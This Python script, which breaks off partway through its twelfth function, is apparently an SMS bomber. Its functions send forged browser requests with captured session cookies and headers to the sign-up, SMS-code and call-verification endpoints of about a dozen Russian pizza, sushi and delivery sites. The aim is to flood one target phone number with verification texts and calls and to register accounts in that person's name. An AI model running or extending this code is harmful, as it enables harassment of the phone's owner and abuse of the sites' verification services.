import requests
from pprint import pprint
PHONE = ""
def serv2():
    try:
        cookies = {
        'PHPSESSID': 'D6jy0b5et4XMzOd3Pfyl6nEYgHoWLcti',
        'BITRIX_SM_GUEST_ID': '9997268',
        'BITRIX_SM_SALE_UID': '30d55355ae31bf2400171fc22c745cd2',
        'tmr_lvid': 'ad7484de010daeeef60b5adc6aa211a2',
        'tmr_lvidTS': '1773754265042',
        '_ym_uid': '1773754265303821514',
        '_ym_visorc': 'w',
        'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A12%2C%22EXPIRE%22%3A1773773940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D',
        '_ym_isad': '2',
        'domain_sid': 'zgUD5bGrrpXNKfRVSNr2N%3A1773754266288',
        '_ym_d': '1773754267',
        'BITRIX_SM_LAST_VISIT': '17.03.2026%2018%3A31%3A07',
        'tmr_detect': '0%7C1773754268138',
        }

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://lv-pizza.ru',
            'priority': 'u=1, i',
            'referer': 'https://lv-pizza.ru/?srsltid=AfmBOoqScpWn1AFIYx5SxAMJjtIHEQ1tIaTk-CDdK_dwjR8HQ7zM47zr',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
            # 'cookie': 'PHPSESSID=D6jy0b5et4XMzOd3Pfyl6nEYgHoWLcti; BITRIX_SM_GUEST_ID=9997268; BITRIX_SM_SALE_UID=30d55355ae31bf2400171fc22c745cd2; tmr_lvid=ad7484de010daeeef60b5adc6aa211a2; tmr_lvidTS=1773754265042; _ym_uid=1773754265303821514; _ym_visorc=w; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A12%2C%22EXPIRE%22%3A1773773940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; domain_sid=zgUD5bGrrpXNKfRVSNr2N%3A1773754266288; _ym_d=1773754267; BITRIX_SM_LAST_VISIT=17.03.2026%2018%3A31%3A07; tmr_detect=0%7C1773754268138',
        }

        data = f'phone=%2B{PHONE[0]}+({PHONE[1:4]})+{PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}&action=send&call=Y&zone=Asia%2FYekaterinburg'
        print(data)
        response = requests.post('https://lv-pizza.ru/ajax/sms_new.php', cookies=cookies, headers=headers, data=data)
        print(f"serv2 - {response.status_code}")
    except:
        print(f"serv2 - error")
def serv3():
    try:
        cookies = {
        '_yasc': 'q61SnbQS2bO/XNPk7P2m0NPsFA+s2b+1EtaR+UsgzY6wPC5hbkwRp8oLhtTOA8w=',
        '_ga': 'GA1.2.585135803.1773755323',
        '_gid': 'GA1.2.1050422689.1773755324',
        '_gat_gtag_UA_222882258_1': '1',
        '_ym_uid': '1773755324716996701',
        '_ym_d': '1773755324',
        '_ym_isad': '2',
        '_ym_visorc': 'b',
        'analytic_id': '1773755324564593',
        '_ga_40TSJRCTXV': 'GS2.1.s1773755323$o1$g1$t1773755330$j53$l0$h0',
        }
        headers = {
            'accept': 'application/json',
            'accept-language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://papajohns.ru',
            'priority': 'u=1, i',
            'referer': 'https://papajohns.ru/',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            # 'cookie': '_yasc=q61SnbQS2bO/XNPk7P2m0NPsFA+s2b+1EtaR+UsgzY6wPC5hbkwRp8oLhtTOA8w=; _ga=GA1.2.585135803.1773755323; _gid=GA1.2.1050422689.1773755324; _gat_gtag_UA_222882258_1=1; _ym_uid=1773755324716996701; _ym_d=1773755324; _ym_isad=2; _ym_visorc=b; analytic_id=1773755324564593; _ga_40TSJRCTXV=GS2.1.s1773755323$o1$g1$t1773755330$j53$l0$h0',
        }
        json_data = {
            'phone': f'+{PHONE}',
            'platform': 'web',
            'city_id': '261',
            'lang': 'ru',
        }
        response = requests.post('https://api.papajohns.ru/v2/user/signup-by-phone', cookies=cookies, headers=headers, json=json_data)
        print(f"serv3 - {response.status_code}")
    except:
        print(f"serv3 - error")
def serv4():
    try:
        cookies = {
            '_ym_uid': '1773770465544724476',
            '_ym_d': '1773770465',
            'mgo_uid': 'EBLBuwBm18yu2IWziXDl',
            'mgo_cnt': '3',
            '_ym_isad': '2',
            '_ym_visorc': 'w',
            'mgo_sid': '60gbtdVqdp11003blexv',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'Origin': 'https://tochka-vkusa.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://tochka-vkusa.ru/',
            # 'Cookie': '_ym_uid=1773770465544724876; _ym_d=1773770465; mgo_uid=E3LBuwBm18yu2IWziXDl; mgo_cnt=3; _ym_isad=2; _ym_visorc=w; mgo_sid=60gbtd6qdp11003blexv',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        json_data = {
            'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
            'password': 'qwerty123',
            'passwordReply': 'qwerty123',
        }

        response = requests.put('https://tochka-vkusa.ru/api/registration', cookies=cookies, headers=headers, json=json_data)
        print(f"serv4 - {response.status_code}")
    except:
        print(f"serv4 - error")
def serv5():
    try:
        cookies = {
            '_ym_uid': '1773840971236173969',
            '_ym_d': '1773840971',
            '_ym_isad': '2',
            'connect.sid': 's%3AGTUjtP2Ic03GN9ZbAUvtnGr5P8btsOy6.oiAFDpJVxEBPUL4fP%2FxZS4C33Ma8kzfuc2qhLt1gA0k',
            '_ym_visorc': 'w',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'Origin': 'https://arigatosurgut.com',
            'Connection': 'keep-alive',
            'Referer': 'https://arigatosurgut.com/',
            # 'Cookie': '_ym_uid=1773840971236173969; _ym_d=1773840971; _ym_isad=2; connect.sid=s%3AGTUjtP2Ic03GN9ZbAUvtnGr5P8btsOy6.oiAFDpJVxEBPUL4fP%2FxZS4C33Ma8kzfuc2qhLt1gA0k; _ym_visorc=w',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        json_data = {
            'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
            'password': 'qwerty',
            'passwordReply': 'qwerty',
        }

        response = requests.put('https://arigatosurgut.com/api/registration', cookies=cookies, headers=headers, json=json_data)
        print(f"serv5 - {response.status_code}")
    except:
        print(f"serv5 - error")
def serv6():
    try:
        cookies = {
            'uuid': '73980358-807f-1b98-0c35-cef10a3b8d14',
            'encodedIP': 'dKlKmBfXaAnAmThBrIfFoLrTaA',
            'i18n_redirected': 'ru',
            'theme': 'light',
            'city_id': '1',
            'department_id': '0',
            'delivery_type': 'delivery',
            '_ym_uid': '1773846500943348776',
            '_ym_d': '1773846500',
            '_ym_isad': '2',
            '__session__id': '165570024269babfe430f0c0.21211349',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://tichpizza.ru/krasnoyarsk',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=4a16bbd621ce4e2589fbaa08b87cd91c,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=false,sentry-sample_rand=0.7503387247392285,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'sentry-trace': '4a16bbd621ce4e2589fbaa08b87cd91c-9da4f11f0e469a3b-0',
            'sitenew': '1',
            'uuid': '73980358-807f-1b98-0c35-cef10a3b8d14',
            'x-api-key': '12773774',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            'Origin': 'https://tichpizza.ru',
            'Connection': 'keep-alive',
            # 'Cookie': 'uuid=73980358-807f-1b98-0c35-cef10a3b8d14; encodedIP=dKlKmBfXaAnAmThBrIfFoLrTaA; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; _ym_uid=1773846500943348776; _ym_d=1773846500; _ym_isad=2; __session__id=165570024269babfe430f0c0.21211349',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://tichpizza.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
        print(f"serv6 - {response.status_code}")
    except:
        print(f"serv6 - error")
def serv7():
    try:
        cookies = {
        '_GPSLSC': 'Qr8wCGAZr1!3N5KWYuEGf!vp531Cn8Kr!L0_pR2dQbZ!lS8zMAdnCG!Qr0yfDXPyx!uh8fSmytpE!mwFhmvD-YP!f9prmllK9_!RDsctNFT8b',
        'PHPSESSID': 'j9cHjQnauakoNQQBmSWoGjgHDPUMFbaQ',
        'BITRIX_SM_TZ': 'Asia/Yekaterinburg',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-03-19%2019%3A04%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.ru%2F',
        'sbjs_first_add': 'fd%3D2026-03-19%2019%3A04%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.ru%2F',
        'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dyandex.ru%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29',
        'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dyandex.ru%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236',
        't_source': 'referral%7Cyandex.ru',
        '_ga': 'GA1.2.80662755.1773929089',
        '_gid': 'GA1.2.1299857072.1773929089',
        '_gat': '1',
        '_dc_gtm_test': '1',
        '_ym_uid': '1773929089882178216',
        '_ym_d': '1773929089',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        '_ga_LTKVQQPHG2': 'GS2.2.s1773929089$o1$g0$t1773929089$j60$l0$h0',
        }

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.pizzaldo.ru',
            'priority': 'u=1, i',
            'referer': 'https://www.pizzaldo.ru/catalog/pizza/?ysclid=mmxjkqz4o5327456236',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
            # 'cookie': '_GPSLSC=Qr8wCGAZr1!3N5KWYuEGf!vp531Cn8Kr!L0_pR2dQbZ!lS8zMAdnCG!Qr0yfDXPyx!uh8fSmytpE!mwFhmvD-YP!f9prmllK9_!RDsctNFT8b; PHPSESSID=j9cHjQnauakoNQQBmSWoGjgHDPUMFbaQ; BITRIX_SM_TZ=Asia/Yekaterinburg; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-19%2019%3A04%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.ru%2F; sbjs_first_add=fd%3D2026-03-19%2019%3A04%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.ru%2F; sbjs_current=typ%3Dreferral%7C%7C%7Csrc%3Dyandex.ru%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dreferral%7C%7C%7Csrc%3Dyandex.ru%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236; t_source=referral%7Cyandex.ru; _ga=GA1.2.80662755.1773929089; _gid=GA1.2.1299857072.1773929089; _gat=1; _dc_gtm_test=1; _ym_uid=1773929089882178216; _ym_d=1773929089; _ym_isad=2; _ym_visorc=w; _ga_LTKVQQPHG2=GS2.2.s1773929089$o1$g0$t1773929089$j60$l0$h0',
        }

        params = {
            'action': 'auth',
        }
        data = {
            'CSRF': '',
            'ACTION': 'REGISTER',
            'MODE': 'PHONE',
            'PHONE': f"+{PHONE[0]} {PHONE[1:4]} {PHONE[4:7]} {PHONE[7:9]} {PHONE[9:11]}",
            'PASSWORD': 'qwerty',
            'PASSWORD2': 'qwerty',
        }

        response = requests.post('https://www.pizzaldo.ru/catalog/pizza/', params=params, cookies=cookies, headers=headers, data=data)
        print(f"serv7 - {response.status_code}")
    except:
        print(f"serv7 - error")
def serv8():
    try:
        cookies = {
        'uuid': '556a6caa-fdd1-f002-9704-1be2051fb550',
        'encodedIP': 'dKlKmBfXaAnAmTbSlOfFoLrTgN',
        'i18n_redirected': 'ru',
        'theme': 'light',
        'city_id': '60',
        'department_id': '0',
        'delivery_type': 'delivery',
        '_ym_uid': '1775135708723440957',
        '_ym_d': '1775135708',
        'tmr_lvid': '636973f61f188fa24003f59cc8b6b744',
        'tmr_lvidTS': '1775135707609',
        '_ym_isad': '2',
        '__session__id': '6460009169ce6bd93d5cb0.50399316',
        'domain_sid': 'O4UN968KOKvx2u9-VTP2j%3A1775135708859',
        'is_city-confirmed': 'true',
        'tmr_detect': '0%7C1775135710170',
        }

        headers = {
            'accept': 'application/json',
            'accept-language': 'ru',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=dc9b701a50aa4f74885b469dcaeffca2,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=false,sentry-sample_rand=0.6053204409537386,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'origin': 'https://rolik-sushi.ru',
            'priority': 'u=1, i',
            'referer': 'https://rolik-sushi.ru/omsk?utm_term=goulash_direct&etext=2202.r2YfmGR1fzjzhdvQX-PAOfcPRJujYlPm980bRweI2-_YaCVYhCpRplzYjJdq2_GfcmV6anp4ZHl4c25hdm1mcA.94bac8f389da08993f7428b51f2e2e673001c29c&yclid=2968623337557458943&ybaip=1',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sentry-trace': 'dc9b701a50aa4f74885b469dcaeffca2-a871caad08907b7e-0',
            'sitenew': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'uuid': '556a6caa-fdd1-f002-9704-1be2051fb550',
            'x-api-key': '9649494',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            # 'cookie': 'uuid=556a6caa-fdd1-f002-9704-1be2051fb550; encodedIP=dKlKmBfXaAnAmTbSlOfFoLrTgN; i18n_redirected=ru; theme=light; city_id=60; department_id=0; delivery_type=delivery; _ym_uid=1775135708723440957; _ym_d=1775135708; tmr_lvid=636973f61f188fa24003f59cc8b6b744; tmr_lvidTS=1775135707609; _ym_isad=2; __session__id=6460009169ce6bd93d5cb0.50399316; domain_sid=O4UN968KOKvx2u9-VTP2j%3A1775135708859; is_city-confirmed=true; tmr_detect=0%7C1775135710170',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://rolik-sushi.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
        print(f"serv8 - {response.status_code}")
    except:
        print(f"serv8 - error")
def serv9():
    try:
        cookies = {
            'kbSession': '17751361399253470',
            'kbCheck': '79fccb15cfbfc560005aa7548bbafd45',
            'kbT': 'true',
            'kbUserID': '164351970739166353',
            '_ym_uid': '1775136141302752711',
            '_ym_d': '1775136141',
            '_ym_isad': '2',
            '_ym_visorc': 'w',
            'muSWLG': 'SBydcZwNjzeUKPMaDhXLbgOifVAWvY',
            'SBydcZwNjzeUKPMaDhXLbgOifVAWvY': '33644fe01d6a913f44c994b4fdb993d8-1775136159-1775136155',
            '_ga': 'GA1.1.73258741.1775136164',
            'tmr_lvid': 'dfe62fa28a43783e7df24679fbf279d5',
            'tmr_lvidTS': '1775136163910',
            'domain_sid': 'xNGlW9RUrynkEuZlKwk-1%3A1775136164734',
            'euCookiesAcc': 'true',
            '_ga_D0D5B6TPCL': 'GS2.1.s1775136163$o1$g1$t1775136170$j53$l0$h0',
            'tmr_detect': '0%7C1775136172775',
            'muSWLG_hits': '7',
        }

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ru',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://rp55.ru',
            'Referer': 'https://rp55.ru/cart/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            # 'Cookie': 'kbSession=17751361399253470; kbCheck=79fccb15cfbfc560005aa7548bbafd45; kbT=true; kbUserID=164351970739166353; _ym_uid=1775136141302752711; _ym_d=1775136141; _ym_isad=2; _ym_visorc=w; muSWLG=SBydcZwNjzeUKPMaDhXLbgOifVAWvY; SBydcZwNjzeUKPMaDhXLbgOifVAWvY=33644fe01d6a913f44c994b4fdb993d8-1775136159-1775136155; _ga=GA1.1.73258741.1775136164; tmr_lvid=dfe62fa28a43783e7df24679fbf279d5; tmr_lvidTS=1775136163910; domain_sid=xNGlW9RUrynkEuZlKwk-1%3A1775136164734; euCookiesAcc=true; _ga_D0D5B6TPCL=GS2.1.s1775136163$o1$g1$t1775136170$j53$l0$h0; tmr_detect=0%7C1775136172775; muSWLG_hits=7',
        }
        formatted_phone = f"{PHONE[0]}({PHONE[1:4]}){PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}"
        data = f"action=do_insert&phone={formatted_phone}&cookie=false"

        response = requests.post('https://rp55.ru/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        print(f"serv9 - {response.status_code}")
    except:
        print(f"serv9 - error")
def serv10():
    try:
        cookies = {
            'uuid': '055561d5-1dca-d5c3-9cf8-2d6a13b1d252',
            'encodedIP': 'dKlKmBfXaAnApFgItGuUlOiG',
            'i18n_redirected': 'ru',
            'theme': 'light',
            'city_id': '1',
            'department_id': '0',
            'delivery_type': 'delivery',
            '_ym_uid': '1775136658773893202',
            '_ym_d': '1775136658',
            '_ym_isad': '2',
            'is_city-confirmed': 'true',
            '__session__id': '103197001069ce6f8f3d6318.27721499',
        }

        headers = {
            'accept': 'application/json',
            'accept-language': 'ru',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=abc6aa0e2efa455bbb35d58c807ea34f,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=true,sentry-sample_rand=0.19615489869961866,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'origin': 'https://barashka55.ru',
            'priority': 'u=1, i',
            'referer': 'https://barashka55.ru/omsk/shaurma?ysclid=mnhij4wxte268772195',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sentry-trace': 'abc6aa0e2efa455bbb35d58c807ea34f-aeea611756be9fb8-1',
            'sitenew': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'uuid': '055561d5-1dca-d5c3-9cf8-2d6a13b1d252',
            'x-api-key': '9300034',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            # 'cookie': 'uuid=055561d5-1dca-d5c3-9cf8-2d6a13b1d252; encodedIP=dKlKmBfXaAnApFgItGuUlOiG; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; _ym_uid=1775136658773893202; _ym_d=1775136658; _ym_isad=2; is_city-confirmed=true; __session__id=103197001069ce6f8f3d6318.27721499',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://barashka55.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
        print(f"serv10 - {response.status_code}")
    except:
        print(f"serv10 - error")
def serv11():
    try:
        cookies = {
            '__js_p_': '579,1800,0,0,0',
            '__jhash_': '229',
            '__jua_': 'Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0',
            '__hash_': '3dd857e7e18f7371e7a2131a6bb5f378',
            '__lhash_': '1938cf45cb9e4face979b5d8ed62628d',
            'NEXT_LOCALE': 'ru',
            'utm_source': 'yandex.ru',
            'utm_medium': 'organic',
            'utm_campaign': 'yandex.ru',
            'sessionId': '748295b6-1c9d-41c2-893c-eb8d785757d7',
            '_ym_uid': '1775138586991868164',
            '_ym_d': '1775138586',
            '_ym_isad': '2',
            '_ym_visorc': 'w',
            'city': '%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%B2%D0%BE%D1%81%D1%82%D0%BE%D0%BA',
        }

        headers = {
            'accept': 'application/json',
            'accept-language': 'ru',
            'authcode': '',
            'content-type': 'application/json',
            'lang': 'ru',
            'origin': 'https://sicilian-pizzeria.ru',
            'priority': 'u=1, i',
            'referer': 'https://sicilian-pizzeria.ru/',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sessionid': '748295b6-1c9d-41c2-893c-eb8d785757d7',
            'timezone': 'Asia/Yekaterinburg',
            'uber-trace-id': '5dce35069c427a2763d75b7168f8fae0:33ad96c7928d9baa:0:1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            # 'cookie': '__js_p_=579,1800,0,0,0; __jhash_=229; __jua_=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0; __hash_=3dd857e7e18f7371e7a2131a6bb5f378; __lhash_=1938cf45cb9e4face979b5d8ed62628d; NEXT_LOCALE=ru; utm_source=yandex.ru; utm_medium=organic; utm_campaign=yandex.ru; sessionId=748295b6-1c9d-41c2-893c-eb8d785757d7; _ym_uid=1775138586991868164; _ym_d=1775138586; _ym_isad=2; _ym_visorc=w; city=%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%B2%D0%BE%D1%81%D1%82%D0%BE%D0%BA',
        }

        json_data = {
            'phone': PHONE,
        }

        response = requests.post('https://sicilian-pizzeria.ru/api/auth/resetCode', cookies=cookies, headers=headers, json=json_data)
        print(f"serv11 - {response.status_code}")
    except:
        print(f"serv11 - error")
def serv12():
    try:
        cookies = {
            'redirectUrl': '%2Foauth%2Fauthorize%3Fclient_id%3D9d84230270d586a0e88ee509b9f552cc%26redirect_uri%3Dhttps%253A%252F%252Fasi.ru%252Fbitrix%252Ftools%252Foauth%252Fleader.php%253Fbackurl%253D%25252Fauth%25252F%26response_type%3Dcode%26state%3Dsite_id%253Ds1%26backurl%3D%252Fauth%252F',
            '_ym_uid': '1678219180971834918',
            '_ym_d': '1678219180',
            '_ym_isad': '1',
            '_ga': 'GA1.2.958854515.1678219180',
            '_gid': 'GA1.2.1395163383.1678219180',
            '_ym_visorc': 'w',
            '_gat': '1',
        }

        headers = {
            'authority': 'leader-id.ru',
            'accept': 'application/json',
            'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            # 'cookie': 'redirectUrl=%2Foauth%2Fauthorize%3Fclient_id%3D9d84230270d586a0e88ee509b9f552cc%26redirect_uri%3Dhttps%253A%252F%252Fasi.ru%252Fbitrix%252Ftools%252Foauth%252Fleader.php%253Fbackurl%253D%25252Fauth%25252F%26response_type%3Dcode%26state%3Dsite_id%253Ds1%26backurl%3D%252Fauth%252F; _ym_uid=1678219180971834918; _ym_d=1678219180; _ym_isad=1; _ga=GA1.2.958854515.1678219180; _gid=GA1.2.1395163383.1678219180; _ym_visorc=w; _gat=1',
            'origin': 'https://leader-id.ru',
            'referer': 'https://leader-id.ru/registration',
